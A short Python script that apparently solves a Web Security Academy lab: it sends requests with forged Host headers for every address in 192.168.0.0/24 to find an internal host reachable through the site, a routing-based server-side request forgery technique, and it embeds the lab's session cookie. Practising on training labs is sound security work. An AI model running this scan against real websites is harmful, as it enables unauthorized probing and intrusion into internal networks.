import time
import aiohttp
import asyncio

url = 'https://acf21f9b1e71eb93c0ac814700260094.web-security-academy.net/'

cookies = {'session': 'amTv1g1i2y5ia53M4PnYdTNcOyle1aui', '_lab': '46%7cMCwCFAIKiekNNXN1WNZcSYl41LV3hjLZAhQLwHklZV89VjKkNDvDamQ5zLMUiWFYH2Q2295gpVCvIar28QUpfTXZjUKR2oxpdIdKt6L%2f7%2fvpWsGgAAuzalXPKZk8fPdxlxpgkHZlAa2s2XATDOL5W9SJLYS5T0kaFK%2bWgWadwBlbNcs%3d'}

async def test_ip(session, ip):
    ip = f"192.168.0.{ip}"

    async with session.get(url=url, headers={'Host': ip}) as resp:
        return (resp.status != 200, ip)

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.get(url=url) as resp:
            pass

        tasks = []
        for ip in range(256):
            tasks.append(asyncio.ensure_future(test_ip(session, ip))) 

        res = await asyncio.gather(*tasks)
        for invalid, ip in res:
            if not invalid:
                print(f"Found ip {ip}")

asyncio.run(main())
